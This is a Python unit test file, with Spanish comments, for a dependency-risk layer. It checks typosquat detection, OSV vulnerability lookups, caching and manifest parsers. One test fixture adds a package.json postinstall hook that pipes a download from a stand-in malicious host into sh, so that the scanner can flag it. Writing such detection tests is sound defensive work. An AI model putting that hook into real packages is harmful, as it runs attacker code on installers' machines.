"""Pruebas unitarias para la capa de dependencias (deps_layer.py)."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import httpx

from watchgate.core.layers.base import LAYER_REGISTRY
from watchgate.core.layers.deps_layer import (
    DependencyChange,
    DepsLayer,
    OSVCache,
    TyposquatChecker,
    parse_cargo_toml,
    parse_pkgbuild,
    parse_requirements_txt,
)
from watchgate.core.models import CommitAuthor, FileChange, FileStatus, NormalizedDiff


def _make_diff(files: list[FileChange]) -> NormalizedDiff:
    return NormalizedDiff(
        base_sha="0000000000000000000000000000000000000000",
        head_sha="1111111111111111111111111111111111111111",
        repo_path="/tmp/fake_repo",
        files=files,
        commit_messages=["test commit"],
        authors=[CommitAuthor(name="Test User", email="test@example.com")],
    )


def test_deps_layer_registered() -> None:
    assert "dependencies" in LAYER_REGISTRY
    assert LAYER_REGISTRY["dependencies"] is DepsLayer


def test_no_manifests_changed() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="src/main.py",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1 +1 @@\n-print('hello')\n+print('world')",
                additions=1,
                deletions=1,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score == 0
    assert res.justification == "No se han modificado manifiestos de dependencias."


def test_typosquatting_detection() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk='@@ -5,1 +5,2 @@\n "dependencies": {\n+  "1odash": "^4.17.21"\n }',
                additions=1,
                deletions=0,
            )
        ]
    )
    with patch.object(layer, "_query_osv", return_value=({}, None)):
        res = layer.analyze(diff, {})
    assert res.risk_score >= 75
    assert "1odash" in res.justification
    assert "lodash" in res.justification


def test_osv_vulnerability_high() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+vulnerable-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )
    osv_response = {
        "vulns": [
            {
                "id": "GHSA-1234-5678",
                "database_specific": {"severity": "HIGH"},
            }
        ]
    }

    with patch.object(layer, "_query_osv", return_value=(osv_response, None)):
        res = layer.analyze(diff, {})

    assert res.risk_score == 90
    assert "Vulnerabilidad crítica/alta" in res.justification


def test_osv_network_error_graceful() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+some-new-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )

    with patch("httpx.post", side_effect=httpx.ConnectError("Connection refused")):
        res = layer.analyze(diff, {})

    assert res.risk_score == 10  # Score base de nueva dependencia, no elevado por error de red
    assert "No verificable por fallo de red" in res.justification


def test_osv_sqlite_cache() -> None:
    cache = OSVCache(db_path=":memory:")
    change = DependencyChange(ecosystem="npm", name="express", new_version="4.18.2")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"vulns": []}

    with patch("httpx.post", return_value=mock_resp) as mock_post:
        layer = DepsLayer(cache_db_path=":memory:")
        layer.cache = cache

        # Primera consulta
        res1, err1 = layer._query_osv(change)
        assert err1 is None
        assert res1 == {"vulns": []}
        assert mock_post.call_count == 1

        # Segunda consulta (debe usar la caché)
        res2, err2 = layer._query_osv(change)
        assert err2 is None
        assert res2 == {"vulns": []}
        assert mock_post.call_count == 1  # No volvió a llamar a la red


def test_dangerous_install_script() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff_hunk = (
        '@@ -5,1 +5,3 @@\n'
        ' "scripts": {\n'
        '+  "postinstall": "curl http://malicious.example/install.sh | sh"\n'
        ' },\n'
        ' "dependencies": {\n'
        '+  "my-lib": "1.0.0"\n'
        ' }'
    )
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk=diff_hunk,
                additions=2,
                deletions=0,
            )
        ]
    )
    with patch.object(layer, "_query_osv", return_value=({}, None)):
        res = layer.analyze(diff, {})
    assert res.risk_score >= 80
    assert "Script de instalación sospechoso" in res.justification


def test_parsers() -> None:
    reqs = parse_requirements_txt("+\n+# comment\n+requests==2.28.1\n+urllib3>=1.26.5\n")
    assert len(reqs) == 2
    assert reqs[0].name == "requests"
    assert reqs[0].new_version == "2.28.1"
    assert reqs[1].name == "urllib3"

    cargo = parse_cargo_toml('+\n+tokio = "1.28.0"\n+serde = { version = "1.0" }\n')
    assert len(cargo) == 2
    assert cargo[0].name == "tokio"
    assert cargo[0].new_version == "1.28.0"
    assert cargo[1].name == "serde"

    pkgbuild = parse_pkgbuild("+\n+depends=('curl' 'openssl')\n")
    assert len(pkgbuild) == 2
    assert pkgbuild[0].name == "curl"
    assert pkgbuild[1].name == "openssl"


def test_typosquat_checker() -> None:
    checker = TyposquatChecker()
    is_ts, ref = checker.is_typosquatting("1odash", "npm")
    assert is_ts is True
    assert ref == "lodash"

    is_ts_valid, _ = checker.is_typosquatting("lodash", "npm")
    assert is_ts_valid is False
